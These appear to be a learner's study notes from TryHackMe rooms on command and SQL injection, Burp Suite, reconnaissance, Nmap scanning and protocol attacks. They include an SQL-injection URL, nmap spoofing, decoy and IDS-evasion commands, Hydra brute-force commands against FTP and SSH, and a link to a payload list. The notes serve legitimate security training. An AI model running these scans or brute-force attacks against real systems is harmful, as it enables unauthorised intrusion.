# Room 11
## Command injection 
	 Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named `joe` will execute commands under this `joe` user - and therefore obtain any permissions that `joe` has.
Also known under Remote code execution. It's one of the top  vulnerability out there  

Applications that use user input to populate system commands with data can often be combined in unintended behaviour. **For example, the shell operators `;`, `&` and `&&` will combine two (or more) system commands and execute them both**. If you are unfamiliar with this concept, it is worth checking out the [Linux fundamentals module](https://tryhackme.com/module/linux-fundamentals) to learn more about this.
#### CI detection 
- Blind command injection : is when the execution have no direct return shown instead you need to check the execution of the application 
- Verbose command injection : when the execution have a direct return like when running `whoami` 

#### Prevention
- don't use **Vulnerable Functions** 
- Input sanitisation 
RCE shit [cheat sheet](https://github.com/payloadbox/command-injection-payload-list)

# Room 12
## SQL injection 
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:  

`https://website.thm/blog?id=2;--` 
Which would then, in turn, produce the SQL statement:  
`SELECT * from blog where id=2;-- and private=0 LIMIT 1;`  

**The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment**. By doing this, you're just, in fact, running the query:  

`SELECT * from blog where id=2;--`


# BURP SUITE
# Room 13
## Burp Suite: The Basics
In essence, Burp Suite is a Java-based framework designed to serve as a comprehensive solution for conducting web application penetration testing. It has become the industry standard tool for hands-on security assessments of web and mobile applications, including those that rely on **a**pplication **p**rogramming **i**nterface**s** (APIs).

Simply put, Burp Suite captures and enables manipulation of all the HTTP/HTTPS traffic between a browser and a web server. This fundamental capability forms the backbone of the framework. By intercepting requests, users have the flexibility to route them to various components within the Burp Suite framework, which we will explore in upcoming sections. The ability to intercept, view, and modify web requests before they reach the target server or even manipulate responses before they are received by our browser makes Burp Suite an invaluable tool for manual web application testing.

#### Feature of burp community
- **Proxy**: The Burp Proxy is the most renowned aspect of Burp Suite. It enables interception and modification of requests and responses while interacting with web applications.
- **Repeater**: Another well-known feature. [Repeater](https://tryhackme.com/room/burpsuiterepeater) allows for capturing, modifying, and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error (e.g., in SQLi - Structured Query Language Injection) or testing the functionality of an endpoint for vulnerabilities.
- **Intruder**: Despite rate limitations in Burp Suite Community, [Intruder](https://tryhackme.com/room/burpsuiteintruder) allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints.
- **Decoder**: [Decoder](https://tryhackme.com/room/burpsuiteom) offers a valuable service for data transformation. It can decode captured information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging Decoder within Burp Suite can be highly efficient.
- **Comparer**: As the name suggests, [Comparer](https://tryhackme.com/room/burpsuiteom) enables the comparison of two pieces of data at either the word or byte level. While not exclusive to Burp Suite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.
- **Sequencer**: [Sequencer](https://tryhackme.com/room/burpsuiteom) is typically employed when assessing the randomness of tokens, such as session cookie values or other supposedly randomly generated data. If the algorithm used for generating these values lacks secure randomness, it can expose avenues for devastating attacks.

# Room 14 
##  Burp Suite: Repeater
essence, Burp Suite Repeater enables us to modify and resend intercepted requests to a target of our choosing. It allows us to take requests captured in the Burp Proxy and manipulate them, sending them repeatedly as needed. Alternatively, we can manually create requests from scratch, similar to using a command-line tool like cURL.

The ability to edit and resend requests multiple times makes Repeater invaluable for manual exploration and testing of endpoints. It provides a user-friendly graphical interface for crafting request payloads and offers various views of the response, including a rendering engine for a graphical representation.

# Room 15
##  Burp Suite: Intruder

	Intruder is Burp Suite's built-in fuzzing tool that allows for automated request modification and repetitive testing with variations in input values. By using a captured request (often from the Proxy module), Intruder can send multiple requests with slightly altered values based on user-defined configurations. It serves various purposes, such as brute-forcing login forms by substituting username and password fields with values from a wordlist or performing fuzzing attacks using wordlists to test subdirectories, endpoints, or virtual hosts. Intruder's functionality is comparable to command-line tools like **Wfuzz** or **ffuf**.

#### Position 
The **Positions** tab of Burp Suite Intruder has a dropdown menu for selecting the attack type. Intruder offers four attack types, each serving a specific purpose. Let's explore each of them:

1. **Sniper**: The Sniper attack type is the default and most commonly used option. It cycles through the payloads, inserting one payload at a time into each position defined in the request. Sniper attacks iterate through all the payloads in a linear fashion, allowing for precise and focused testing.
    
2. **Battering ram**: The Battering ram attack type differs from Sniper in that it sends all payloads simultaneously, each payload inserted into its respective position. This attack type is useful when testing for race conditions or when payloads need to be sent concurrently.
    
3. **Pitchfork**: The Pitchfork attack type enables the simultaneous testing of multiple positions with different payloads. It allows the tester to define multiple payload sets, each associated with a specific position in the request. Pitchfork attacks are effective when there are distinct parameters that need separate testing.
    
4. **Cluster bomb**: The Cluster bomb attack type combines the Sniper and Pitchfork approaches. It performs a Sniper-like attack on each position but simultaneously tests all payloads from each set. This attack type is useful when multiple positions have different payloads, and we want to test them all together.

# Room 16 
## Burp Suite: Other Modules

o summarize, Decoder allows you to encode and decode data, making it easier to read and understand the information being transferred. Comparer enables you to spot differences between two datasets, which can be pivotal in identifying vulnerabilities or anomalies. Sequencer helps in performing entropy analysis on tokens, providing insights into the randomness of their generation and, consequently, their security level. Organizer enables you to store and annotate copies of HTTP requests that you may want to revisit later.

# Room 17
## Burp Suite: Extensions



# NETWORK SECURITY MODEL 

# Room 18

## Passive Reconnaissance 
	In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target. Think of it like you are looking at target territory from afar without stepping foot on that territory.
	Passive reconnaissance activities include many activities, for instance:
	- Looking up DNS records of a domain from a public DNS server.
	- Checking job ads related to the target website.
	- Reading news articles about the target company.

	Active reconnaissance, on the other hand, cannot be achieved so discreetly. It requires direct engagement with the target. Think of it like you check the locks on the doors and windows, among other potential entry points.
	Examples of active reconnaissance activities include:
	- Connecting to one of the company servers such as HTTP, FTP, and SMTP.
	- Calling the company in an attempt to get information (social engineering).
	- Entering company premises pretending to be a repairman.

#### Whois 
WHOIS is a request and response protocol that follows the [RFC 3912](https://www.ietf.org/rfc/rfc3912.txt) specification. A WHOIS server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing. The WHOIS server replies with various information related to the domain requested. Of particular interest, we can learn:

- Registrar: Via which registrar was the domain name registered?
- Contact info of registrant: Name, organization, address, phone, among other things. (unless made hidden via a privacy service)
- Creation, update, and expiration dates: When was the domain name first registered? When was it last updated? And when does it need to be renewed?
- Name Server: Which server to ask to resolve the domain name?
#### Nslookup 

| Query type | Result             |
| ---------- | ------------------ |
| A          | IPv4 Addresses     |
| AAAA       | IPv6 Addresses     |
| CNAME      | Canonical Name     |
| MX         | Mail Servers       |
| SOA        | Start of Authority |
| TXT        | TXT Records        |
####  [DNSDumpster](https://dnsdumpster.com/). I
	DNS lookup tools, such as nslookup and dig, cannot find subdomains on their own. The domain you are inspecting might include a different subdomain that can reveal much information about the target. For instance, if tryhackme.com has the subdomains wiki.tryhackme.com and webmail.tryhackme.com, you want to learn more about these two as they can hold a trove of information about your target. There is a possibility that one of these subdomains has been set up and is not updated regularly. Lack of proper regular updates usually leads to vulnerable services.
#### [Shodan.io](https://www.shodan.io/)
Shodan.io tries to connect to every device reachable online to build a search engine of connected “things” in contrast with a search engine for web pages. Once it gets a response, it collects all the information related to the service and saves it in the database to make it searchable. Consider the saved record of one of tryhackme.com’s servers

| Purpose                                                | Commandline Example                       |
| ------------------------------------------------------ | ----------------------------------------- |
| Lookup WHOIS record                                    | `whois tryhackme.com`                     |
| Lookup DNS A records                                   | `nslookup -type=A tryhackme.com`          |
| Lookup DNS MX records at DNS server                    | `nslookup -type=MX tryhackme.com 1.1.1.1` |
| Lookup DNS TXT records                                 | `nslookup -type=TXT tryhackme.com`        |
| Lookup DNS A records                                   | `dig tryhackme.com A`                     |
| Lookup DNS MX records at DNS server                    | `dig @1.1.1.1 tryhackme.com MX`           |
| <br><br><br><br><br><br><br><br>Lookup DNS TXT records | `dig tryhackme.com TXT`                   |

# Room 19 
##  Active Reconnaissance
	Active reconnaissance requires you to make some kind of contact with your target. This contact can be a phone call or a visit to the target company under some pretence to gather more information, usually as part of social engineering. Alternatively, it can be a direct connection to the target system, whether visiting their website or checking if their firewall has an SSH port open. Think of it like you are closely inspecting windows and door locks. Hence, it is essential to remember not to engage in active reconnaissance work before getting signed legal authorization from the client.


#### Web browser 
There are also plenty of add-ons for Firefox and Chrome that can help in penetration testing. Here are a few examples:

- **FoxyProxy** lets you quickly change the proxy server you are using to access the target website. This browser extension is convenient when you are using a tool such as Burp Suite or if you need to switch proxy servers regularly. You can get FoxyProxy for Firefox from [here](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard).
- **User-Agent Switcher and Manager** gives you the ability to pretend to be accessing the webpage from a different operating system or different web browser. In other words, you can pretend to be browsing a site using an iPhone when in fact, you are accessing it from Mozilla Firefox. You can download User-Agent Switcher and Manager for Firefox [here](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher).
- **Wappalyzer** provides insights about the technologies used on the visited websites. Such extension is handy, primarily when you collect all this information while browsing the website like any other user. A screenshot of Wappalyzer is shown below. You can find Wappalyzer for Firefox [here](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer).


#### Ping 
	the ping is a command that sends an ICMP Echo packet to a remote system. If the remote system is online, and the ping packet was correctly routed and not blocked by any firewall, the remote system should send back an ICMP Echo Reply. Similarly, the ping reply should reach the first system if appropriately routed and not blocked by any firewall.

#### Traceroute
	the traceroute command _traces the route_ taken by the packets from your system to another host. The purpose of a traceroute is to find the IP addresses of the routers or hops that a packet traverses as it goes from your system to a target host. This command also reveals the number of routers between the two systems. It is helpful as it indicates the number of hops (routers) between your system and the target host. However, note that the route taken by the packets might change as many routers use dynamic routing protocols that adapt to network changes.
To summarize, we can notice the following:

- The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
- Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
- Some routers don’t return a reply

#### Telnet 
he telnet client, with its simplicity, can be used for other purposes. Knowing that telnet client relies on the TCP protocol, you can use Telnet to connect to any service and grab its banner. Using `telnet 10.10.0.75 PORT`, you can connect to any service running on TCP and even exchange a few messages unless it uses encryption.

Let’s say we want to discover more information about a web server, listening on port 80. We connect to the server at port 80, and then we communicate using the HTTP protocol. You don’t need to dive into the HTTP protocol; you just need to issue `GET / HTTP/1.1`. To specify something other than the default index page, you can issue `GET /page.html HTTP/1.1`, which will request `page.html`. We also specified to the remote web server that we want to use HTTP version 1.1 for communication. To get a valid response, instead of an error, you need to input some value for the host `host: example` and hit enter twice. Executing these steps will provide the requested index page.

#### Netcat 
	Netcat or simply `nc` has different applications that can be of great value to a pentester. Netcat supports both TCP and UDP protocols. It can function as a client that connects to a listening port; alternatively, it can act as a server that listens on a port of your choice. Hence, it is a convenient tool that you can use as a simple client or server over TCP or UDP.

option	meaning
-l	Listen mode
-p	Specify the Port number
-n	Numeric only; no resolution of hostnames via DNS
-v	Verbose output (optional, yet useful to discover any bugs)
-vv	Very Verbose (optional)
-k	Keep listening after client disconnects



|Command|Example|
|---|---|
|ping|`ping -c 10 10.10.210.225` on Linux or macOS|
|ping|`ping -n 10 10.10.210.225` on MS Windows|
|traceroute|`traceroute 10.10.210.225` on Linux or macOS|
|tracert|`tracert 10.10.210.225` on MS Windows|
|telnet|`telnet 10.10.210.225 PORT_NUMBER`|
|netcat as client|`nc 10.10.210.225 PORT_NUMBER`|
|netcat as server|`nc -lvnp PORT_NUMBER`|
# Room 19

## Nmap live host discovery

When we want to target a network, we want to find an efficient tool to help us handle repetitive tasks and answer the following questions:

1. Which systems are up?
2. What services are running on these systems?
Nmap use three method to scan for live system 
	ARP scan 
	ICMP scan 
	TCP/UDP ping scan 
The step that Nmap take to discover a live host 
![[nmap-phase.png]]
We can use multiple methide to scan for host based on the IP address 
	- list: `MACHINE_IP scanme.nmap.org example.com` will scan 3 IP addresses.
	- range: `10.11.12.15-20` will scan 6 IP addresses: `10.11.12.15`, `10.11.12.16`,… and `10.11.12.20`.
	- subnet: `MACHINE_IP/30` will scan 4 IP addresses.

We can leverage the the protocol of the ISO layers in our scan 
![[OSI-TCP.png]]

#### ARP nmap
To scan the network using Nmap ARP option the host that will be scanned need to be in the same network and we can do that using the command below :
`nmap -sn -PR id_address` -sn is for not scanning the port 

An other tool to scan the local network using arp is `arp-scan`

#### PING nmap
An other way to use nmap is trough the ping protocol with the flag `-PE`

Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the `-PP` option tells Nmap to use ICMP timestamp requests. As shown in the figure below, you expect live hosts to reply.

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option `-PM`. As shown in the figure below, live hosts are expected to reply to ICMP address mask requests.
**-PE (ICMP Echo Request)**

- Sends standard ICMP echo request packets (ping packets)
- This is the default and most common ping method
- Equivalent to the regular `ping` command you'd use from command line
- Many firewalls and systems block these since they're well-known

**-PP (ICMP Timestamp Request)**

- Sends ICMP timestamp request packets
- Less commonly filtered than echo requests
- Asks the target system for its current time
- Can sometimes bypass firewalls that only block echo requests
- Uses ICMP type 13 packets

**-PM (ICMP Address Mask Request)**

- Sends ICMP address mask request packets
- Even less commonly used and filtered
- Originally designed to request subnet mask information
- Uses ICMP type 17 packets
- Often effective against systems that block other ICMP types

#### TCP nmap 
**SYN Ping**
If you want Nmap to use TCP SYN ping, you can do so via the option `-PS` followed by the port number, range, list, or a combination of them. For example, `-PS21` will target port 21, while `-PS21-25` will target ports 21, 22, 23, 24, and 25. Finally `-PS80,443,8080` will target the three ports 80, 443, and 8080.
**ACK Ping**
By default, port 80 is used. The syntax is similar to TCP SYN ping. `-PA` should be followed by a port number, range, list, or a combination of them. For example, consider `-PA21`, `-PA21-25` and `-PA80,443,8080`. If no port is specified, port 80 will be used.

#### UDP nmap
**UDP Ping**
Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available. `-PU`

**Masscan**

On a side note, Masscan uses a similar approach to discover the available systems. However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: `-p` can be followed by a port number, list, or range. Consider the following examples:

- `masscan MACHINE_IP/24 -p443`
- `masscan MACHINE_IP/24 -p80,443`
- `masscan MACHINE_IP/24 -p22-25`
- `masscan MACHINE_IP/24 ‐‐top-ports 100`

|Scan Type|Example Command|
|---|---|
|ARP Scan|`sudo nmap -PR -sn MACHINE_IP/24`|
|ICMP Echo Scan|`sudo nmap -PE -sn MACHINE_IP/24`|
|ICMP Timestamp Scan|`sudo nmap -PP -sn MACHINE_IP/24`|
|ICMP Address Mask Scan|`sudo nmap -PM -sn MACHINE_IP/24`|
|TCP SYN Ping Scan|`sudo nmap -PS22,80,443 -sn MACHINE_IP/30`|
|TCP ACK Ping Scan|`sudo nmap -PA22,80,443 -sn MACHINE_IP/30`|
|UDP Ping Scan|`sudo nmap -PU53,161,162 -sn MACHINE_IP/30`|

|Option|Purpose|
|---|---|
|`-n`|no DNS lookup|
|`-R`|reverse-DNS lookup for all hosts|
|`-sn`|host discovery only|

# Room 20
## Nmap Basic Port Scans
#### Port stats 
1. **Open**: indicates that a service is listening on the specified port.
2. **Closed**: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
3. **Filtered**: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
4. **Unfiltered**: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan `-sA`.
5. **Open|Filtered**: This means that Nmap cannot determine whether the port is open or filtered.
6. **Closed|Filtered**: This means that Nmap cannot decide whether a port is closed or filtered.
#### TCP flags
1. **URG**: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
2. **ACK**: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
3. **PSH**: Push flag asking TCP to pass the data to the application promptly.
4. **RST**: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
5. **SYN**: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
6. **FIN**: The sender has no more data to send.

To illustrate the `-sT` (TCP connect scan), the following command example returned a detailed list of the open ports. this flag scan for open port by establishing a three way hand check first the nmap send a `SYN`request to all if a machine responded with  `SYN/ACK` it mean that the port is open and then the hand shake is dropped.

`-F`: for fast mode like scan only the 100 common port 
`-r` : for scanning the port in consecutive order 

*TCP SYN scan*
The SYN scan does not need to complete the hand shake using the `-sS`
*UDP scan*
You can select UDP scan using the `-sU`
 we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

#### Port tuning 
we can specify the port or the range we want nmap to scan 
- port list: `-p22,80,443` will scan ports 22, 80 and 443.
- port range: `-p1-1023` will scan all ports between 1 and 1023 inclusive, while `-p20-25` will scan ports between 20 and 25 inclusive.
`-p-` for ports specifying if nothing add to the -p it will scan all 65535 port 
`-F` fast mode will scan the most common 100 port 
`-T<0-5>`for the time for scanning  
	- paranoid (0)
	- sneaky (1)
	- polite (2)
	- normal (3)
	- aggressive (4)
	- insane (5)
Alternatively, you can choose to control the packet rate using `--min-rate <number>` and `--max-rate <number>`. For example, `--max-rate 10` or `--max-rate=10` ensures that your scanner is not sending more than ten packets per second.

`max-parallelism | min-parallelism` control the amount of packet sent in parallel 

|Port Scan Type|Example Command|
|---|---|
|TCP Connect Scan|`nmap -sT 10.10.67.22`|
|TCP SYN Scan|`sudo nmap -sS 10.10.67.22`|
|UDP Scan|`sudo nmap -sU 10.10.67.22`|

These scan types should get you started discovering running TCP and UDP services on a target host.

|  Option                 | Purpose                                  |
| ----------------------- | ---------------------------------------- |
| `-p-`                   | all ports                                |
| `-p1-1023`              | scan ports 1 to 1023                     |
| `-F`                    | 100 most common ports                    |
| `-r`                    | scan ports in consecutive order          |
| `-T<0-5>`               | -T0 being the slowest and T5 the fastest |
| `--max-rate 50`         | rate <= 50 packets/sec                   |
| `--min-rate 15`         | rate >= 15 packets/sec                   |
| `--min-parallelism 100` | at least 100 probes in parallel          |
# Room 21 
## Nmap Advanced Port Scans
#### Type of scan 
*null scan `-sN`*
a tcp packet with no flag is sent to the hosts 
a lack of response  indicate the port is open instead in the case of a close port we expect a response with the flag REST 
*Fin scan `-sF`*
Just like the full scan no response is expected 
*Xmas scan `-sX`*
The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously.
*TCP Maimon Scan `-sM`*
*TCP ACK scan `-sA`*
the host always respond with a rest regardles of the port state 
*Windows scan `-sW`*
just like the ACK scan but here the it examine the windows field in the rest answer 
*Custom Scan*
If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using `--scanflags` . For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using `--scanflags RSTSYNFIN` . As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.

#### Spoofing and Decoys
`nmap -S SPOOFED_IP 10.10.162.55`
`nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.162.55̀` 
		-e : interface; -Pn: not waiting for ping response; -S:for spoofed ip adress 

`nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.162.55̀` 
		-D : decoy it take a bunch of ip address and make them the source of the request 
#### Avoid detection 
to avoid detection by IDS and Firewall there is a way that by fragmenting the packet 
nmap provides the option `-f` to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another `-f` (`-f -f` or `-ff`) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the `--mtu`; however, you should always choose a multiple of 8.

#### Zombie scan 
The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using `nmap -sI ZOMBIE_IP MACHINE_IP`, where `ZOMBIE_IP` is the IP address of the idle host (zombie).

The idle (zombie) scan requires the following three steps to discover whether a port is open:

1. Trigger the idle host to respond so that you can record the current IP ID on the idle host.
2. Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
3. Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.

#### Summary 

|Port Scan Type|Example Command|
|---|---|
|TCP Null Scan|`sudo nmap -sN 10.10.105.50`|
|TCP FIN Scan|`sudo nmap -sF 10.10.105.50`|
|TCP Xmas Scan|`sudo nmap -sX 10.10.105.50`|
|TCP Maimon Scan|`sudo nmap -sM 10.10.105.50`|
|TCP ACK Scan|`sudo nmap -sA 10.10.105.50`|
|TCP Window Scan|`sudo nmap -sW 10.10.105.50`|
|Custom TCP Scan|`sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.105.50`|
|Spoofed Source IP|`sudo nmap -S SPOOFED_IP 10.10.105.50`|
|Spoofed MAC Address|`--spoof-mac SPOOFED_MAC`|
|Decoy Scan|`nmap -D DECOY_IP,ME 10.10.105.50`|
|Idle (Zombie) Scan|`sudo nmap -sI ZOMBIE_IP 10.10.105.50`|
|Fragment IP data into 8 bytes|`-f`|
|Fragment IP data into 16 bytes|`-ff`|

|Option|Purpose|
|---|---|
|`--source-port PORT_NUM`|specify source port number|
|`--data-length NUM`|append random data to reach given length|

These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.

|Option|Purpose|
|---|---|
|`--reason`|explains how Nmap made its conclusion|
|`-v`|verbose|
|`-vv`|very verbose|
|`-d`|debugging|
|`-dd`|more details for debugging|
# Room 22
## Nmap Post Port Scans
	Here we will focus on what come next after the port scan like OS detection and similar action 
#### Service detection 
*`-sV`* 
Adding `-sV` to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with `--version-intensity LEVEL` where the level ranges between 0, the lightest, and 9, the most complete. `-sV --version-light` has an intensity of 2, while `-sV --version-all` has an intensity of 9.
##### OS detection 
`-O
Nmap can detect the Operating System (OS) based on its behaviour and any telltale signs in its responses. OS detection can be enabled using `-O`; this is an _uppercase O_ as in OS. In this example, we ran `nmap -sS -O 10.10.181.90``
#### Traceroute
`--traceroute`
With this we can find the route  to the target 

#### Nmap Scripting 
By default nmap provide a list of script that can be used as add on they are located under `usr/shar/nmap/script`

| Script Category | Description                                                            |
| --------------- | ---------------------------------------------------------------------- |
| `auth`          | Authentication related scripts                                         |
| `broadcast`     | Discover hosts by sending broadcast messages                           |
| `brute`         | Performs brute-force password auditing against logins                  |
| `default`       | Default scripts, same as `-sC`                                         |
| `discovery`     | Retrieve accessible information, such as database tables and DNS names |
| `dos`           | Detects servers vulnerable to Denial of Service (DoS)                  |
| `exploit`       | Attempts to exploit various vulnerable services                        |
| `external`      | Checks using a third-party service, such as Geoplugin and Virustotal   |
| `fuzzer`        | Launch fuzzing attacks                                                 |
| `intrusive`     | Intrusive scripts such as brute-force attacks and exploitation         |
| `malware`       | Scans for backdoors                                                    |
| `safe`          | Safe scripts that won’t crash the target                               |
| `version`       | Retrieve service versions                                              |
| `vuln`          | Checks for vulnerabilities or exploit vulnerable services              |
Nmap script are a grate advantage so you should have a deep dive into them 

#### Saving the output 

there are three way we can save the output of a nmap result 
- normal `-oN filename`
- grep `-oG filename`
- XML `-oX filename`
- combine all the above one `-oA`

#### Summary 
|Option|Meaning|
|---|---|
|`-sV`|determine service/version info on open ports|
|`-sV --version-light`|try the most likely probes (2)|
|`-sV --version-all`|try all available probes (9)|
|`-O`|detect OS|
|`--traceroute`|run traceroute to target|
|`--script=SCRIPTS`|Nmap scripts to run|
|`-sC` or `--script=default`|run default scripts|
|`-A`|equivalent to `-sV -O -sC --traceroute`|
|`-oN`|save output in normal format|
|`-oG`|save output in grepable format|
|`-oX`|save output in XML format|
|`-oA`|save output in normal, XML and Grepable formats|

# Room 23
## Protocols and Servers
#### Telnet port:23
telnet si a protocol that is used to connect to remote machine it's the old version of the SSH
it problem is that the data is transferred in clear text any one can intercept the traffic and see the username and password of the user connected to the machine trough telnet 

#### HTTP port:80
Http is a protocol uses to communicate with wed application like website trough a browser, we can also use telnet or ssh to communicate with a web server we only need to send request our self instead of the browser  
![[telnet.png]]
#### FTP port:21
File Transfer Protocol (FTP) was developed to make the transfer of files between different computers with different systems efficient.
ftp use to stream 
- one for establishing the connection with the service 
- one to transfer the data 

#### SMTP port:25
Email delivery over the Internet requires the following components:

1. Mail Submission Agent (MSA)
2. Mail Transfer Agent (MTA)
3. Mail Delivery Agent (MDA)
4. Mail User Agent (MUA)
![[SMTP-process.png]]
#### POP3 port:110
Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.
![[SMTP.png]]
#### IMAP port:143
Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox

# Room 24
## Protocols and Servers 2
Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

1. Sniffing Attack (Network Packet Capture)
2. Man-in-the-Middle (MITM) Attack
3. Password Attack (Authentication Attack)
4. Vulnerabilities
![[CIA-DAD.png]]

#### Sniffing attack 
Sniffing attack refers to using a network packet capture tool to collect information about the target. When a protocol communicates in cleartext, the data exchanged can be captured by a third party to analyse. A simple network packet capture can reveal information, such as the content of private messages and login credentials, if the data isn't encrypted in transit.
#### Man In The middele
A Man-in-the-Middle (MITM) attack occurs when a victim (A) believes they are communicating with a legitimate destination (B) but is unknowingly communicating with an attacker (E).

#### TLS
SSL (Secure Sockets Layer) started when the world wide web started to see new applications, such as online shopping and sending payment information. Netscape introduced SSL in 1994, with SSL 3.0 being released in 1996. But eventually, more security was needed, and TLS (Transport Layer Security) protocol was introduced in 1999. Before we explain what TLS and SSL provide, let’s see how they fit the networking model.

Because of the close relation between SSL and TLS, one might be used instead of the other. However, TLS is more secure than SSL, and it has practically replaced SSL. We could have dropped SSL and just written TLS instead of SSL/TLS, but we will continue to mention the two to avoid any ambiguity because the term SSL is still in wide use. However, we can expect all modern servers to be using TLS.

#### SSH
Secure Shell (SSH) was created to provide a secure way for remote system administration. In other words, it lets you securely connect to another system over the network and execute commands on the remote system. Put simply, the “S” in SSH stands for secure, which can be summarized simply as:

1. You can confirm the identity of the remote server
2. Exchanged messages are encrypted and can only be decrypted by the intended recipient
3. Both sides can detect any modification in the messages
#### password attack.
Attacks against passwords are usually carried out by:

1. Password Guessing: Guessing a password requires some knowledge of the target, such as their pet’s name and birth year.
2. Dictionary Attack: This approach expands on password guessing and attempts to include all valid words in a dictionary or a wordlist.
3. Brute Force Attack: This attack is the most exhaustive and time-consuming where an attacker can go as far as trying all possible character combinations, which grows fast (exponential growth with the number of characters).
*Hydra for password attack*
Consider the following concrete examples:

- `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.44.77 ftp` will use `mark` as the username as it iterates over the provided passwords against the FTP server.
- `hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.44.77` is identical to the previous example. `10.10.44.77 ftp` is the same as `ftp://10.10.44.77`.
- `hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.44.77 ssh` will use `frank` as the user name as it tries to login via SSH using the different passwords.

|Protocol|TCP Port|Application(s)|Data Security|
|---|---|---|---|
|FTP|21|File Transfer|Cleartext|
|FTPS|990|File Transfer|Encrypted|
|HTTP|80|Worldwide Web|Cleartext|
|HTTPS|443|Worldwide Web|Encrypted|
|IMAP|143|Email (MDA)|Cleartext|
|IMAPS|993|Email (MDA)|Encrypted|
|POP3|110|Email (MDA)|Cleartext|
|POP3S|995|Email (MDA)|Encrypted|
|SFTP|22|File Transfer|Encrypted|
|SSH|22|Remote Access and File Transfer|Encrypted|
|SMTP|25|Email (MTA)|Cleartext|
|SMTPS|465|Email (MTA)|Encrypted|
|Telnet|23|Remote Access|Cleartext|

Hydra remains a very efficient tool that you can launch from the terminal to try the different passwords. We summarize its main options in the following table.

| Option            | Explanation                                                   |
| ----------------- | ------------------------------------------------------------- |
| `-l username`     | Provide the login name                                        |
| `-P WordList.txt` | Specify the password list to use                              |
| `server service`  | Set the server address and service to attack                  |
| `-s PORT`         | Use in case of non-default service port number                |
| `-V` or `-vV`     | Show the username and password combinations being tried       |
| `-d`              | Display debugging output if the verbose output is not helping |

# Vulnerabilities research 
# Room 25
## Vulnerabilities 101
A vulnerability in cybersecurity is defined as a weakness or flaw in the design, implementation or behaviors of a system or application. An attacker can exploit these weaknesses to gain access to unauthorized information or perform unauthorised actions. The term “vulnerability” has many definitions by cybersecurity bodies. However, there is minimal variation between them all.

#### Vulnerabilities categories  

